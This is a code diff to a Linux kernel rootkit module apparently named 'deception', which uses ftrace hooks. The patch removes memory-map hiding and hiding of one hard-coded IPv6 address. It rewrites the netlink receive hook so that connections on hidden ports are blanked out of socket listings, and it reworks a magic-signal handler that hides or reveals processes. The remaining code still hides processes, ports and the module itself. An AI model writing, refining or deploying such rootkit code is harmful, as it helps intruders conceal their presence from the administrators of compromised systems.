@@ -20,13 +20,11 @@
 #include <linux/in.h>
 #include <net/sock.h>
 #include <linux/kmod.h>
-#include <linux/inet.h>   // Required for in6_pton
+#include <linux/inet.h>
 #include <net/ipv6.h>
 
 #include "ftrace_helper.h"
 
-static struct in6_addr target_ip6;
-#define IP6_ADDRESS_TO_HIDE "2601:603:a7c:71c0:baba:19db:8655:2938"
 #define MOD_REVEAL 8000
 #define GET_ROOT 31337
 
@@ -44,16 +42,10 @@ static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
 typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
 static kallsyms_lookup_name_t my_kallsyms_lookup_name;
 
-/* vmap hiding structures */
-static struct list_head *my_vmap_area_list;
-static spinlock_t *my_vmap_area_lock;
-static struct rb_root *my_vmap_area_root;
-
 /* module hiding state */
 static struct list_head *prev_module;
 static struct kobject *kobj_parent;
 static struct list_head *saved_kobj_entry;
-static struct vmap_area *saved_va = NULL;
 static short hidden = 0;
 
 /* --- Port Hiding Array Tracker --- */
@@ -93,66 +85,8 @@ static bool is_port_hidden(u16 port)
     return false;
 }
 
-/* RB-tree insertion helper for vmap_area_root */
-static void vmap_area_rb_insert(struct vmap_area *va, struct rb_root *root)
-{
-    struct rb_node **new = &(root->rb_node);
-    struct rb_node *parent = NULL;
-
-    while (*new) {
-        struct vmap_area *this = rb_entry(*new, struct vmap_area, rb_node);
-        parent = *new;
-
-        if (va->va_start < this->va_start) {
-            new = &((*new)->rb_left);
-        } else if (va->va_start > this->va_start) {
-            new = &((*new)->rb_right);
-        } else {
-            return;
-        }
-    }
-
-    rb_link_node(&va->rb_node, parent, new);
-    rb_insert_color(&va->rb_node, root);
-}
 
 /* Remove THIS_MODULE from vmap structures */
-void hideme_memory(void)
-{
-    struct vmap_area *va, *tmp;
-    unsigned long addr = (unsigned long)THIS_MODULE;
-
-    if (!my_vmap_area_list || !my_vmap_area_lock)
-        return;
-
-    spin_lock(my_vmap_area_lock);
-    list_for_each_entry_safe(va, tmp, my_vmap_area_list, list) {
-        if (addr >= va->va_start && addr < va->va_end) {
-            saved_va = va;
-            list_del(&va->list);
-            if (my_vmap_area_root)
-                rb_erase(&va->rb_node, my_vmap_area_root);
-            break;
-        }
-    }
-    spin_unlock(my_vmap_area_lock);
-}
-
-/* Restore THIS_MODULE into vmap structures */
-void showme_memory(void)
-{
-    if (saved_va && my_vmap_area_list && my_vmap_area_lock) {
-        spin_lock(my_vmap_area_lock);
-
-        list_add(&saved_va->list, my_vmap_area_list);
-
-        if (my_vmap_area_root)
-            vmap_area_rb_insert(saved_va, my_vmap_area_root);
-
-        spin_unlock(my_vmap_area_lock);
-        saved_va = NULL;
-    }
-}
 
 /* Full structural hide */
 void hideme_full(void)
@@ -170,7 +104,6 @@ void hideme_full(void)
         list_del(&THIS_MODULE->mkobj.kobj.entry);
     }
 
-    hideme_memory();
     hidden = 1;
 }
 
@@ -186,7 +119,6 @@ void showme_full(void)
     if (saved_kobj_entry)
         list_add(&THIS_MODULE->mkobj.kobj.entry, saved_kobj_entry);
 
-    showme_memory();
     hidden = 0;
 }
 
@@ -273,38 +205,44 @@ asmlinkage long hook_recvmsg(const struct pt_regs *regs)
         return ret;
     }
 
-    while (offset + sizeof(struct nlmsghdr) <= ret) {
+    while (offset + NLMSG_HDRLEN <= ret) {
+        long rem = ret - offset;
         nlh = (struct nlmsghdr *)(kbuf + offset);
-        bool hide = false;
 
-        if (nlh->nlmsg_len < sizeof(struct nlmsghdr))
+        if (!NLMSG_OK(nlh, rem))
             break;
 
+        if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR) {
+            offset += NLMSG_ALIGN(nlh->nlmsg_len);
+            continue;
+        }
+
         if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
-            nlh->nlmsg_len >= sizeof(struct nlmsghdr) +
-                              sizeof(struct inet_diag_msg)) {
-            struct inet_diag_msg *diag =
-                (struct inet_diag_msg *)(nlh + 1);
+            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
+
+            struct inet_diag_msg *diag = (struct inet_diag_msg *)NLMSG_DATA(nlh);
+            bool hide = false;
 
             if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
-                is_port_hidden(ntohs(diag->id.idiag_dport)))
+                is_port_hidden(ntohs(diag->id.idiag_dport))) {
                 hide = true;
+            }
+
+            if (hide) {
+                size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
+                
+                /* Overwrite the entire netlink entry payload with zeroes */
+                memset(NLMSG_DATA(nlh), 0, msg_len - NLMSG_HDRLEN);
+                
+                /* Turn the header into a NOOP so the ss parser skips it safely */
+                nlh->nlmsg_type = NLMSG_NOOP;
+            }
         }
 
-        if (hide) {
-            long reclen = nlh->nlmsg_len;
-            long tail   = ret - (offset + reclen);
-
-            if (tail > 0)
-                memmove(kbuf + offset,
-                        kbuf + offset + reclen,
-                        tail);
-            ret -= reclen;
-        } else {
-            offset += nlh->nlmsg_len;
-        }
+        offset += NLMSG_ALIGN(nlh->nlmsg_len);
     }
 
+    /* Copy back the exact total length (ret) to prevent truncation errors */
     copy_to_user(iov_base, kbuf, ret);
     kvfree(kbuf);
     return ret;
@@ -387,38 +325,27 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
         return 0;
     }
 
-    /* Signal 62: hide, reveal, or clear PIDs */
+    /* Signal 62: hide/unhide processes */
     if (sig == 62) {
-        /* FIX: Read straight from the raw CPU register to catch the literal 0 input */
-        pid_t raw_pid = (pid_t)regs->di;
-
-        if (raw_pid == 0) {
+        if (pid == 0) {
             clear_all_hidden_pids();
-            pr_info("[deception] Cleared all hidden PIDs via global clear trigger (0)\n");
             return 0;
         }
 
         snprintf(pid_str, sizeof(pid_str), "%d", pid);
-        pid_entry = find_hidden_pid(pid_str);
 
+        if (remove_hidden_pid(pid_str))
+            return 0;
+
+        pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
         if (pid_entry) {
-            /* If it is already hidden, remove it to restore visibility */
-            list_del(&pid_entry->list);
-            kfree(pid_entry);
-            pr_info("[deception] PID %s is now REVEALED\n", pid_str);
-        } else {
-            /* If it's not hidden, allocate and hide it */
-            pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
-            if (pid_entry) {
-                strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
-                list_add(&pid_entry->list, &hidden_pids_list);
-                pr_info("[deception] PID %s is now HIDDEN\n", pid_str);
-            }
+            strscpy(pid_entry->pid_str,
+                    pid_str,
+                    sizeof(pid_entry->pid_str));
+            list_add(&pid_entry->list, &hidden_pids_list);
         }
         return 0;
     }
-
-
 
     /* Signal 61: hide/unhide network ports (IPv6 only via tcp6_seq_show) */
     if (sig == 61) {
@@ -454,16 +381,7 @@ asmlinkage long hook_kill(const struct pt_regs *regs)
 
 static asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
 {
-    if (v != SEQ_START_TOKEN && v != NULL) {
-        struct sock *sk = (struct sock *)v;
-
-        /* Hide specific IPv6 address */
-        if (sk->sk_family == AF_INET6) {
-            if (ipv6_addr_equal(&sk->sk_v6_daddr, &target_ip6) ||
-                ipv6_addr_equal(&sk->sk_v6_rcv_saddr, &target_ip6))
-                return 0;
-        }
-    }
+    /* IPv6 address hiding removed */
 
     if (v != SEQ_START_TOKEN && v != NULL && hidden_ports_count > 0) {
         struct sock *sk = (struct sock *)v;
@@ -500,14 +418,7 @@ static int __init deception_init(void)
 {
     int err;
 
-    my_vmap_area_list = (struct list_head *)lookup_name("vmap_area_list");
-    my_vmap_area_lock = (spinlock_t *)lookup_name("vmap_area_lock");
-    my_vmap_area_root = (struct rb_root *)lookup_name("vmap_area_root");
-
-    if (in6_pton(IP6_ADDRESS_TO_HIDE, -1,
-                 target_ip6.s6_addr, -1, NULL) != 1) {
-        printk(KERN_ERR "deception: Failed to parse IPv6 address\n");
-    }
+    /* IPv6 address parsing removed */
 
     err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
     if (err)
